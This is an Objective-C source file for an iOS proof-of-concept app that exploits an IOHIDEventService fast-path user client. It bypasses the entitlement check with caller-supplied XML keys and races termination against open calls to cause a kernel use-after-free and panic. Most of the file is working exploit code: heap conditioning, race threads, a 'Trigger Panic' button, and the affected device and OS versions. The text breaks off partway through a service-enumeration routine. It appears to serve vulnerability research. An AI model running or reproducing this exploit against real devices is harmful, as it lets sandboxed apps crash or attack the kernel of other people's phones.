//
//  ViewController.m
//  IOHIDFastPathPOC
//
//  UAF in IOHIDEventServiceFastPathUserClient via termination race.
//
//  ===================== EXACT TRIGGER =====================
//
//  Target: IOHIDEventService provider, opened via IOServiceOpen(type=2)
//          which creates an IOHIDEventServiceFastPathUserClient.
//
//  Auth bypass: selector 0 (open) accepts caller-supplied XML properties:
//    <dict>
//      <key>FastPathHasEntitlement</key><true/>
//      <key>FastPathMotionEventEntitlement</key><true/>
//    </dict>
//  The gate checks these keys instead of actual entitlement flags from
//  initWithTask. Any unprivileged sandboxed app passes the gate. (CWE-863)
//
//  Race setup (3 threads + main loop):
//    OPENER THREADS (x3, QOS_CLASS_USER_INTERACTIVE):
//      Tight loop: sel1 (close) → sel0 (open) on persistent connections.
//      openForClient iterates the provider's internal client collection
//      and calls safeMetaCast on each client object.
//
//    MAIN THREAD (batch loop, 15 seconds):
//      Phase A — pause openers, IOServiceOpen(type=2) + sel0 gate on 16
//                probe connections (no contention while openers paused).
//      Phase B — resume openers, then mach_port_destruct() all 16 probes.
//                Each destruct triggers:
//                  clientClose (vtable+0x560) → self->terminate(0) [ASYNC]
//                  → didTerminate on IOKit termination thread
//                  → close handler (NO command gate) → closeForClient
//                closeForClient modifies the provider's client collection
//                on the termination thread WITHOUT holding any lock.
//                Meanwhile openers call openForClient (through the command
//                gate, on the work loop) which iterates the SAME collection.
//      Wait 80ms for race window, repeat.
//
//  Crash: openForClient → safeMetaCast(freedObj) → LDR X16, [X0]
//         dereferences vtable of object freed by closeForClient. (CWE-416)
//
//  Panic log:
//    panic(cpu N): Kernel tag check fault (MTE)
//    ESR: 0x96000011 (synchronous tag check fault)
//    x0: freed object (MTE tag mismatch: expected 0xf1, got 0xf6)
//    Backtrace: externalMethod → open handler → openForClient
//               → AppleSPU → safeMetaCast+0x1c (CRASH)
//
//  Confirmed on:
//    iPhone 16 Pro (A19 Pro) iOS 26.3 (23D127) — MTE catches UAF
//    iPad 5th gen (A9) iOS 17.7.10 (21H560) — panics without MTE
//
//  =========================================================
//

#import "ViewController.h"
#import <dlfcn.h>
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <mach/mach_time.h>
#import <mach/vm_map.h>
#import <sched.h>
#import <stdatomic.h>
#import <math.h>

// ---------- IOKit type / function-pointer plumbing ----------

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_iterator_t;

typedef CFMutableDictionaryRef (*IOServiceMatchingFn)(const char *name);
typedef io_service_t (*IOServiceGetMatchingServiceFn)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOServiceGetMatchingServicesFn)(mach_port_t, CFDictionaryRef, io_iterator_t *);
typedef kern_return_t (*IOServiceOpenFn)(io_service_t, task_port_t, uint32_t, io_connect_t *);
typedef kern_return_t (*IOServiceCloseFn)(io_connect_t);
typedef kern_return_t (*IOObjectReleaseFn)(io_object_t);
typedef io_object_t   (*IOIteratorNextFn)(io_iterator_t);
typedef kern_return_t (*IOConnectCallMethodFn)(
    io_connect_t connection, uint32_t selector,
    const uint64_t *input, uint32_t inputCnt,
    const void *inputStruct, size_t inputStructCnt,
    uint64_t *output, uint32_t *outputCnt,
    void *outputStruct, size_t *outputStructCnt);
typedef kern_return_t (*IOConnectMapMemoryFn)(
    io_connect_t connect, uint32_t memoryType,
    task_port_t intoTask, mach_vm_address_t *atAddress,
    mach_vm_size_t *ofSize, uint32_t options);

static void *sIOKitHandle = NULL;
static IOServiceMatchingFn            sIOServiceMatching            = NULL;
static IOServiceGetMatchingServiceFn  sIOServiceGetMatchingService  = NULL;
static IOServiceGetMatchingServicesFn sIOServiceGetMatchingServices = NULL;
static IOServiceOpenFn                sIOServiceOpen                = NULL;
static IOServiceCloseFn               sIOServiceClose               = NULL;
static IOObjectReleaseFn              sIOObjectRelease              = NULL;
static IOIteratorNextFn               sIOIteratorNext               = NULL;
static IOConnectCallMethodFn          sIOConnectCallMethod          = NULL;
static IOConnectMapMemoryFn           sIOConnectMapMemory64         = NULL;

// ---------- Constants ----------

static const uint32_t kSelectorOpen      = 0;
static const uint32_t kSelectorClose     = 1;
static const uint32_t kSelectorCopyEvent = 2;
static const uint32_t kMemoryTypeEventBuffer = 0;

// The fast-path gate (sub_FFFFFE000A6AD844) checks for these two keys in the
// caller-supplied OSDictionary. Both present → gate passes → openForClient.
// The actual entitlement flags from initWithTask are loaded but do NOT gate.
static const char kOpenPropertiesXML[] =
    "<dict>"
        "<key>FastPathHasEntitlement</key><true/>"
        "<key>FastPathMotionEventEntitlement</key><true/>"
    "</dict>";

// ---------- Tuning ----------

enum {
    kDesiredConnections    = 15,   // Max connections to same provider
    kLifecycleCycles       = 2000, // close→reopen cycles on conn[0]
    kMagazineDrainCycles   = 32,   // Pre-stress zone conditioning cycles
    kBatchSize             = 16,   // Probe connections per termination race batch
    kNumOpeners            = 3,    // Opener threads for termination race
    kRaceWindowUs          = 80000 // 80ms race window after teardown
};

static const NSTimeInterval kStressDuration   = 25.0;
static const NSTimeInterval kTermRaceDuration = 15.0;

// ---------- ViewController ----------

@interface ViewController ()
@property (nonatomic, strong) UIButton   *triggerButton;
@property (nonatomic, strong) UIButton   *termRaceOnlyButton;
@property (nonatomic, strong) UIButton   *uafFocusButton;
@property (nonatomic, strong) UIButton   *precisionButton;
@property (nonatomic, strong) UIButton   *enumerateButton;
@property (nonatomic, strong) UITextView *logView;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    [self setupUI];
}

#pragma mark - UI

- (void)setupUI {
    self.view.backgroundColor = [UIColor systemBackgroundColor];

    self.termRaceOnlyButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.termRaceOnlyButton.translatesAutoresizingMaskIntoConstraints = NO;
    UIButtonConfiguration *termConf = [UIButtonConfiguration filledButtonConfiguration];
    termConf.baseBackgroundColor = [UIColor systemRedColor];
    self.termRaceOnlyButton.configuration = termConf;
    [self.termRaceOnlyButton setTitle:@"Trigger Panic" forState:UIControlStateNormal];
    [self.termRaceOnlyButton addTarget:self action:@selector(termRaceOnlyTapped)
                forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.termRaceOnlyButton];

    self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11.0 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor secondarySystemBackgroundColor];
    self.logView.text = @"AOP Panic PoC\nPress Trigger Panic to begin.\n";
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [self.termRaceOnlyButton.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
        [self.termRaceOnlyButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.termRaceOnlyButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
        [self.logView.topAnchor constraintEqualToAnchor:self.termRaceOnlyButton.bottomAnchor constant:16],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-12],
    ]];
}

- (void)appendLog:(NSString *)msg {
    NSLog(@"[IOHIDFastPathPOC] %@", msg);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", msg];
        NSRange bottom = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:bottom];
    });
}

#pragma mark - IOKit Symbol Loading

- (BOOL)loadIOKitSymbols {
    if (sIOKitHandle && sIOServiceMatching && sIOServiceOpen && sIOConnectCallMethod)
        return YES;

    if (!sIOKitHandle)
        sIOKitHandle = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW | RTLD_LOCAL);
    if (!sIOKitHandle) return NO;

    sIOServiceMatching            = (IOServiceMatchingFn)           dlsym(sIOKitHandle, "IOServiceMatching");
    sIOServiceGetMatchingService  = (IOServiceGetMatchingServiceFn) dlsym(sIOKitHandle, "IOServiceGetMatchingService");
    sIOServiceGetMatchingServices = (IOServiceGetMatchingServicesFn)dlsym(sIOKitHandle, "IOServiceGetMatchingServices");
    sIOServiceOpen                = (IOServiceOpenFn)               dlsym(sIOKitHandle, "IOServiceOpen");
    sIOServiceClose               = (IOServiceCloseFn)              dlsym(sIOKitHandle, "IOServiceClose");
    sIOObjectRelease              = (IOObjectReleaseFn)             dlsym(sIOKitHandle, "IOObjectRelease");
    sIOIteratorNext               = (IOIteratorNextFn)              dlsym(sIOKitHandle, "IOIteratorNext");
    sIOConnectCallMethod          = (IOConnectCallMethodFn)         dlsym(sIOKitHandle, "IOConnectCallMethod");
    sIOConnectMapMemory64         = (IOConnectMapMemoryFn)          dlsym(sIOKitHandle, "IOConnectMapMemory64");

    return sIOServiceMatching && sIOServiceOpen && sIOServiceClose
        && sIOObjectRelease && sIOIteratorNext && sIOConnectCallMethod;
}

#pragma mark - Connection Helpers

/// Open multiple userclients to the same IOHIDEventServiceFastPathUserClient provider.
/// Each IOServiceOpen(type=2) creates a separate userclient with its own IOCommandGate.
/// Returns connection count; fills outConns[] and optionally *outService.
- (int)openMultipleConnections:(io_connect_t *)outConns
                      maxCount:(int)maxCount
                    outService:(io_service_t *)outService {
    if (!sIOServiceGetMatchingServices || !sIOIteratorNext || maxCount <= 0)
        return 0;

    for (int i = 0; i < maxCount; i++) outConns[i] = MACH_PORT_NULL;
    if (outService) *outService = MACH_PORT_NULL;

    // Match on IOHIDEventService (the provider), NOT the UserClient class.
    // IOServiceOpen with type=2 creates a FastPathUserClient for each connection.
    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
    if (!matching) {
        NSLog(@"[IOHIDFastPathPOC] IOServiceMatching(IOHIDEventService) returned nil");
        return 0;
    }

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) {
        NSLog(@"[IOHIDFastPathPOC] GetMatchingServices failed: 0x%x", kr);
        return 0;
    }

    int total = 0;
    io_service_t service = MACH_PORT_NULL;

    // Iterate all IOHIDEventService instances — some may reject open(type=2)
    while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        io_connect_t firstConn = MACH_PORT_NULL;
        kr = sIOServiceOpen(service, mach_task_self_, 2, &firstConn);
        if (kr != KERN_SUCCESS || firstConn == MACH_PORT_NULL) {
            NSLog(@"[IOHIDFastPathPOC] IOServiceOpen(type=2) failed 0x%x on service, trying next...", kr);
            sIOObjectRelease(service);
            continue;
        }

        // Gate with selector 0 (open) + valid XML properties
        uint64_t scalarIn = 0;
        const char *xml = kOpenPropertiesXML;
        kern_return_t gkr = sIOConnectCallMethod(
            firstConn, kSelectorOpen,
            &scalarIn, 1, xml, strlen(xml) + 1,
            NULL, NULL, NULL, NULL);

        if (gkr != KERN_SUCCESS) {
            NSLog(@"[IOHIDFastPathPOC] sel0 gate failed 0x%x on service, trying next...", gkr);
            sIOServiceClose(firstConn);
            sIOObjectRelease(service);
            continue;
        }

        outConns[0] = firstConn;
        total = 1;
        NSLog(@"[IOHIDFastPathPOC] conn[0] opened+gated (port=0x%x)", firstConn);

        // Open remaining connections to the SAME service
        for (int i = 1; i < maxCount; i++) {
            io_connect_t conn = MACH_PORT_NULL;
            kr = sIOServiceOpen(service, mach_task_self_, 2, &conn);
            if (kr != KERN_SUCCESS || conn == MACH_PORT_NULL) {
                NSLog(@"[IOHIDFastPathPOC] conn[%d] open failed 0x%x", i, kr);
                continue;
            }

            gkr = sIOConnectCallMethod(
                conn, kSelectorOpen,
                &scalarIn, 1, xml, strlen(xml) + 1,
                NULL, NULL, NULL, NULL);
            if (gkr != KERN_SUCCESS) {
                NSLog(@"[IOHIDFastPathPOC] conn[%d] gate failed 0x%x", i, gkr);
                sIOServiceClose(conn);
                continue;
            }

            outConns[total] = conn;
            total++;
            if (total <= 5 || i == maxCount - 1) {
                NSLog(@"[IOHIDFastPathPOC] conn[%d] opened+gated (port=0x%x)", i, conn);
            }
        }

        if (outService) *outService = service;
        else sIOObjectRelease(service);
        break;
    }

    sIOObjectRelease(iter);
    return total;
}

#pragma mark - Main Trigger

- (void)triggerTapped {
    self.triggerButton.enabled = NO;
    [self appendLog:@"\n========== IOHIDFastPath UAF Race =========="];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols"];
        self.triggerButton.enabled = YES;
        return;
    }

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        io_connect_t connsBuf[kDesiredConnections];
        io_connect_t *conns = connsBuf;
        io_service_t providerService = MACH_PORT_NULL;
        int connCount = [self openMultipleConnections:conns
                                             maxCount:kDesiredConnections
                                           outService:&providerService];

        if (connCount < 2) {
            [self appendLog:[NSString stringWithFormat:
                @"Need >= 2 connections, got %d. Aborting.", connCount]];
            dispatch_async(dispatch_get_main_queue(), ^{ self.triggerButton.enabled = YES; });
            return;
        }

        [self appendLog:[NSString stringWithFormat:
            @"Opened %d connections to same provider (separate gates)", connCount]];

        // Map shared memory on primary connection
        mach_vm_address_t mappedAddr = 0;
        mach_vm_size_t mappedSize = 0;
        if (sIOConnectMapMemory64) {
            kern_return_t mkr = sIOConnectMapMemory64(conns[0], kMemoryTypeEventBuffer,
                                                       mach_task_self(), &mappedAddr, &mappedSize, 1);
            [self appendLog:[NSString stringWithFormat:@"MapMemory: 0x%x addr=0x%llx size=%llu",
                             mkr, mappedAddr, mappedSize]];
        }

        // Map aux buffers for reader connections
        mach_vm_address_t auxAddrs[kDesiredConnections];
        mach_vm_size_t auxSizes[kDesiredConnections];
        memset(auxAddrs, 0, sizeof(auxAddrs));
        memset(auxSizes, 0, sizeof(auxSizes));
        if (sIOConnectMapMemory64) {
            for (int i = 1; i < connCount; i++) {
                sIOConnectMapMemory64(conns[i], kMemoryTypeEventBuffer,
                                      mach_task_self(), &auxAddrs[i], &auxSizes[i], 1);
            }
        }

        // ============================================================
        // Phase 1: Allocation conditioning
        // Cycle close/reopen on ALL connections to churn the ClientObject
        // type-isolated zone, priming the free list.
        // ============================================================
        [self appendLog:[NSString stringWithFormat:
            @"Phase 1: Allocation conditioning (%d cycles x %d conns)...", kMagazineDrainCycles, connCount]];

        for (int i = 0; i < kMagazineDrainCycles; i++) {
            for (int c = 0; c < connCount; c++) {
                uint64_t cs = 0;
                sIOConnectCallMethod(conns[c], kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
            }
            for (int c = connCount - 1; c >= 0; c--) {
                uint64_t os = 0;
                sIOConnectCallMethod(conns[c], kSelectorOpen, &os, 1,
                    kOpenPropertiesXML, strlen(kOpenPropertiesXML) + 1, NULL, NULL, NULL, NULL);
            }
        }

        // ============================================================
        // Phase 2: Lifecycle Desync Stress
        //
        // THE RACE:
        //   conn[0] sel1 (gated): closeForClient → frees provider internals
        //   conn[1..N] sel2 (UNGATED): copyEvent → reads provider internals
        //   conn[0] sel0 (gated): openForClient → safeMetaCast on freed obj
        //
        //   Different IOLocks (conn[K]+0x110), same provider state.
        //   closeForClient and copyEvent share internal data structures
        //   at provider+504/+512 without mutual exclusion.
        // ============================================================
        [self appendLog:@"\nPhase 2: Lifecycle desync stress..."];
        [self appendLog:@"  conn[0]: lifecycle thread (close→reopen cycles)"];

        int readerEnd = (connCount > 4) ? (1 + (connCount - 1) / 2) : MIN(connCount, 2);
        int readerCount = readerEnd - 1;
        if (readerCount < 1) readerCount = 1;

        [self appendLog:[NSString stringWithFormat:
            @"  conn[1..%d]: %d reader threads (copyEvent, no gate)", readerEnd - 1, readerCount]];
        [self appendLog:[NSString stringWithFormat:
            @"  conn[%d..%d]: churn threads (close/reopen pressure)", readerEnd, connCount - 1]];

        __block atomic_int stopFlag = 0;
        __block atomic_int readerIters = 0;
        __block atomic_int lifecycleIters = 0;
        __block atomic_int churnIters = 0;
        __block atomic_int anomalies = 0;
        __block atomic_int migErrors = 0;
        __block atomic_int sizeAnomalies = 0;

        dispatch_group_t group = dispatch_group_create();

        // ---- Reader threads: copyEvent on conn[1..readerEnd] ----
        // Sel 2 bypasses command gate (IDA: if selector==2 → direct call).
        // Reader uses persistently OPEN connections → always reaches provider->copyEvent.
        // Races against conn[0]'s closeForClient on provider's shared state.
        for (int rIdx = 1; rIdx < readerEnd && rIdx < connCount; rIdx++) {
            io_connect_t rc = conns[rIdx];
            mach_vm_address_t rMapped = auxAddrs[rIdx];
            mach_vm_size_t rSize = auxSizes[rIdx];

            dispatch_queue_t q = dispatch_queue_create("poc.reader",
                dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

            dispatch_group_enter(group);
            dispatch_async(q, ^{
                uint32_t local = 0;
                while (atomic_load(&stopFlag) == 0) {
                    uint64_t scalarsIn[2] = { 0, 1 };
                    uint8_t structOut[256];
                    size_t structOutSize = sizeof(structOut);

                    kern_return_t kr = sIOConnectCallMethod(
                        rc, kSelectorCopyEvent,
                        scalarsIn, 2, NULL, 0,
                        NULL, NULL, structOut, &structOutSize);

                    local++;

                    if ((kr & 0xFFFF0000) == 0x10000000)
                        atomic_fetch_add(&migErrors, 1);

                    if (kr != KERN_SUCCESS
                        && kr != (kern_return_t)0xE00002CD   // kIOReturnNotReady
                        && kr != (kern_return_t)0xE00002BC   // kIOReturnBadArgument
                        && kr != (kern_return_t)0xE00002BE   // kIOReturnNotOpen
                        && kr != (kern_return_t)0xE00002C2   // kIOReturnExclusiveAccess
                        && kr != (kern_return_t)0xE00002C5   // kIOReturnNotPermitted
                        && (kr & 0xFFFF0000) != 0x10000000)
                        atomic_fetch_add(&anomalies, 1);

                    // Size anomaly: eventSize exceeds mapped region
                    if (rMapped != 0 && rSize >= 8) {
                        uint32_t eventSize = 0;
                        memcpy(&eventSize, (const void *)(uintptr_t)rMapped, sizeof(eventSize));
                        if ((uint64_t)eventSize + 4ULL > (uint64_t)rSize)
                            atomic_fetch_add(&sizeAnomalies, 1);
                    }

                    if ((local & 0x3F) == 0) sched_yield();
                }
                atomic_fetch_add(&readerIters, (int)local);
                dispatch_group_leave(group);
            });
        }

        // ---- Lifecycle thread: rapid close→reopen on conn[0] ----
        // Close (sel 1, gated) → closeForClient(provider) OUTSIDE IOLock.
        // Frees provider internal objects. Reopen allocates new ones.
        // The window between free and realloc is the UAF window.
        dispatch_queue_t lifecycleQ = dispatch_queue_create("poc.lifecycle",
            dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

        dispatch_group_enter(group);
        dispatch_async(lifecycleQ, ^{
            uint32_t local = 0;
            for (int cycle = 0; cycle < kLifecycleCycles && atomic_load(&stopFlag) == 0; cycle++) {
                uint64_t cs = 0;
                sIOConnectCallMethod(conns[0], kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);

                uint64_t os = 0;
                sIOConnectCallMethod(conns[0], kSelectorOpen, &os, 1,
                    kOpenPropertiesXML, strlen(kOpenPropertiesXML) + 1, NULL, NULL, NULL, NULL);

                local++;
                if (cycle % 500 == 0)
                    [self appendLog:[NSString stringWithFormat:@"  Lifecycle %d/%d", cycle, kLifecycleCycles]];
            }
            atomic_store(&lifecycleIters, (int)local);
            dispatch_group_leave(group);
        });

        // ---- Churn threads: close/reopen on conn[readerEnd..N] ----
        // Allocation pressure on provider's internal client structures.
        for (int ci = readerEnd; ci < connCount; ci++) {
            io_connect_t cc = conns[ci];
            dispatch_queue_t q = dispatch_queue_create("poc.churn",
                dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

            dispatch_group_enter(group);
            dispatch_async(q, ^{
                uint32_t local = 0;
                while (atomic_load(&stopFlag) == 0) {
                    uint64_t cs = 0;
                    sIOConnectCallMethod(cc, kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    uint64_t os = 0;
                    sIOConnectCallMethod(cc, kSelectorOpen, &os, 1,
                        kOpenPropertiesXML, strlen(kOpenPropertiesXML) + 1, NULL, NULL, NULL, NULL);
                    local++;
                    if ((local & 0x1F) == 0) sched_yield();
                }
                atomic_fetch_add(&churnIters, (int)local);
                dispatch_group_leave(group);
            });
        }

        // Wait for stress duration
        dispatch_time_t deadline = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kStressDuration * NSEC_PER_SEC));
        long waitResult = dispatch_group_wait(group, deadline);
        if (waitResult != 0) {
            atomic_store(&stopFlag, 1);
            [self appendLog:@"  Stress duration elapsed, stopping..."];
            dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
        }

        [self appendLog:[NSString stringWithFormat:
            @"\nPhase 2 results: reader=%d lifecycle=%d churn=%d",
            atomic_load(&readerIters), atomic_load(&lifecycleIters), atomic_load(&churnIters)]];
        [self appendLog:[NSString stringWithFormat:
            @"  anomalies=%d migErrors=%d sizeAnomalies=%d",
            atomic_load(&anomalies), atomic_load(&migErrors), atomic_load(&sizeAnomalies)]];

        // Release all client slots before termination race
        for (int i = 0; i < connCount; i++) {
            uint64_t cs = 0;
            sIOConnectCallMethod(conns[i], kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
        }

        // ============================================================
        // Phase 3: Termination Race (Batch Pre-Gating)
        //
        // clientClose (vtable+0x560) calls self->terminate(0) [ASYNC].
        // didTerminate fires later on IOKit termination thread.
        // didTerminate → close handler (NO gate) → closeForClient.
        // Meanwhile openers continuously call openForClient (gated).
        // closeForClient (termination thread) vs openForClient (work loop)
        // both access provider's client collection without synchronization.
        //
        // Approach:
        //   Phase A: Pause openers. Pre-gate N probe connections (no contention).
        //   Phase B: Resume openers. mach_port_destroy all probes rapidly.
        //            Each triggers async didTerminate → closeForClient races
        //            with openers' openForClient on provider's client collection.
        // ============================================================
        if (providerService != MACH_PORT_NULL) {
            [self appendLog:@"\nPhase 3: Termination race (batch pre-gating)..."];

            const char *raceXml = kOpenPropertiesXML;
            const size_t raceXmlLen = strlen(raceXml) + 1;

            // Pre-allocate and open opener connections
            io_connect_t openerConns[kNumOpeners];
            int openerCount = 0;
            for (int p = 0; p < kNumOpeners; p++) {
                openerConns[p] = MACH_PORT_NULL;
                kern_return_t pkr = sIOServiceOpen(providerService, mach_task_self_, 2, &openerConns[p]);
                if (pkr != KERN_SUCCESS || openerConns[p] == MACH_PORT_NULL) continue;
                uint64_t s = 0;
                kern_return_t okr = sIOConnectCallMethod(openerConns[p], kSelectorOpen,
                    &s, 1, raceXml, raceXmlLen, NULL, NULL, NULL, NULL);
                if (okr == KERN_SUCCESS) {
                    openerCount++;
                } else {
                    sIOServiceClose(openerConns[p]);
                    mach_port_deallocate(mach_task_self(), openerConns[p]);
                    openerConns[p] = MACH_PORT_NULL;
                }
            }

            [self appendLog:[NSString stringWithFormat:
                @"  %d openers, batch=%d, window=%dus", openerCount, kBatchSize, kRaceWindowUs]];

            if (openerCount > 0) {
                __block volatile int opPause = 1;
                __block volatile int opStop = 0;
                __block volatile int totalOpenerCycles = 0;

                dispatch_group_t openerGroup = dispatch_group_create();

                // Launch opener threads (start paused)
                for (int o = 0; o < openerCount; o++) {
                    io_connect_t oc = openerConns[o];
                    dispatch_group_enter(openerGroup);
                    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
                        uint32_t local = 0;
                        while (!opStop) {
                            while (opPause && !opStop) usleep(50);
                            if (opStop) break;

                            // Close → reopen: openForClient iterates provider's client
                            // collection. THIS is the race target.
                            uint64_t cs = 0;
                            (void)sIOConnectCallMethod(oc, kSelectorClose,
                                &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
                            (void)sIOConnectCallMethod(oc, kSelectorOpen,
                                &cs, 1, raceXml, raceXmlLen, NULL, NULL, NULL, NULL);
                            local++;
                        }
                        __sync_fetch_and_add(&totalOpenerCycles, (int)local);
                        dispatch_group_leave(openerGroup);
                    });
                }

                int totalProbes = 0;
                int batchCount = 0;
                NSDate *raceStart = [NSDate date];

                while ([[NSDate date] timeIntervalSinceDate:raceStart] < kTermRaceDuration) {
                    // Phase A: pause openers, pre-gate probe batch
                    opPause = 1;
                    __sync_synchronize();
                    usleep(1000);

                    io_connect_t probes[kBatchSize];
                    int gated = 0;
                    for (int v = 0; v < kBatchSize; v++) {
                        probes[v] = MACH_PORT_NULL;
                        kern_return_t vkr = sIOServiceOpen(providerService, mach_task_self_, 2, &probes[v]);
                        if (vkr != KERN_SUCCESS || probes[v] == MACH_PORT_NULL) continue;
                        uint64_t s = 0;
                        kern_return_t gkr = sIOConnectCallMethod(probes[v], kSelectorOpen,
                            &s, 1, raceXml, raceXmlLen, NULL, NULL, NULL, NULL);
                        if (gkr != KERN_SUCCESS) {
                            sIOServiceClose(probes[v]);
                            mach_port_deallocate(mach_task_self(), probes[v]);
                            probes[v] = MACH_PORT_NULL;
                            continue;
                        }
                        gated++;
                    }

                    if (gated == 0) { usleep(10000); continue; }

                    // Phase B: resume openers, rapid-fire teardown probes
                    opPause = 0;
                    __sync_synchronize();
                    usleep(2000); // let openers re-enter loops

                    // mach_port_destroy → clientClose → terminate(0) → async didTerminate
                    // didTerminate fires on termination thread → close handler (NO gate)
                    // → closeForClient modifies client collection without synchronization
                    for (int v = 0; v < kBatchSize; v++) {
                        if (probes[v] == MACH_PORT_NULL) continue;
                        mach_port_destruct(mach_task_self(), probes[v], 0, 0);
                        totalProbes++;
                    }

                    usleep(kRaceWindowUs);
                    batchCount++;
                }

                // Stop openers
                opStop = 1;
                opPause = 0;
                __sync_synchronize();
                dispatch_group_wait(openerGroup, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));

                NSTimeInterval elapsed = [[NSDate date] timeIntervalSinceDate:raceStart];
                [self appendLog:[NSString stringWithFormat:
                    @"  TermRace: %d batches, %d probes torn down in %.1fs (%.1f/s)",
                    batchCount, totalProbes, elapsed, totalProbes / fmax(elapsed, 0.001)]];
                [self appendLog:[NSString stringWithFormat:
                    @"  Opener cycles: %d", (int)totalOpenerCycles]];

                // Cleanup openers
                for (int p = 0; p < kNumOpeners; p++) {
                    if (openerConns[p] == MACH_PORT_NULL) continue;
                    uint64_t cs = 0;
                    (void)sIOConnectCallMethod(openerConns[p], kSelectorClose,
                        &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    (void)sIOServiceClose(openerConns[p]);
                    (void)mach_port_deallocate(mach_task_self(), openerConns[p]);
                }
            }

            sIOObjectRelease(providerService);
        } else {
            [self appendLog:@"\nPhase 3 skipped: no provider service port"];
        }

        // Cleanup connections
        for (int i = 0; i < connCount; i++) {
            sIOServiceClose(conns[i]);
        }

        [self appendLog:@"\n========== Done =========="];
        [self appendLog:@"If the device is still alive, the race window was not hit."];
        [self appendLog:@"Re-run to retry — the UAF is timing-dependent."];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.triggerButton.enabled = YES;
        });
    });
}

#pragma mark - Phase 3 Only

- (void)enumerateTapped {
    self.enumerateButton.enabled = NO;
    [self appendLog:@"\n========== Enumerating IOHIDEventService Instances =========="];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols"];
        self.enumerateButton.enabled = YES;
        return;
    }

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self enumerateServices];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.enumerateButton.enabled = YES;
        });
    });
}

/// Enumerate ALL IOHIDEventService instances, log their provider class,
/// and report which accept open(type=2) + selector 0 (FastPath open).
/// Also walks up to grandparent to identify AppleSPU vs other providers.
- (void)enumerateServices {
    if (![self loadIOKitSymbols]) return;

    typedef kern_return_t (*IORegistryEntryGetNameFn)(io_object_t, char *);
    typedef kern_return_t (*IOObjectGetClassFn)(io_object_t, char *);
    typedef kern_return_t (*IORegistryEntryGetParentEntryFn)(io_object_t, const char *, io_object_t *);
    typedef kern_return_t (*IORegistryEntryGetRegistryEntryIDFn)(io_object_t, uint64_t *);
    typedef kern_return_t (*IORegistryEntryGetPathFn)(io_object_t, const char *, char *);

    IORegistryEntryGetNameFn sGetName = (IORegistryEntryGetNameFn)dlsym(sIOKitHandle, "IORegistryEntryGetName");
    IOObjectGetClassFn sGetClass = (IOObjectGetClassFn)dlsym(sIOKitHandle, "IOObjectGetClass");
    IORegistryEntryGetParentEntryFn sGetParent = (IORegistryEntryGetParentEntryFn)dlsym(sIOKitHandle, "IORegistryEntryGetParentEntry");
    IORegistryEntryGetRegistryEntryIDFn sGetEntryID =
        (IORegistryEntryGetRegistryEntryIDFn)dlsym(sIOKitHandle, "IORegistryEntryGetRegistryEntryID");
    IORegistryEntryGetPathFn sGetPath =
        (IORegistryEntryGetPathFn)dlsym(sIOKitHandle, "IORegistryEntryGetPath");

    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
    if (!matching) return;

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (kr != KERN_SUCCESS) return;

    int sel0OkNonSPU = 0;
    int sel0OkSPU = 0;
    int totalSel0Ok = 0;

    io_service_t service;
    int idx = 0;
    while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        char className[128] = {0};
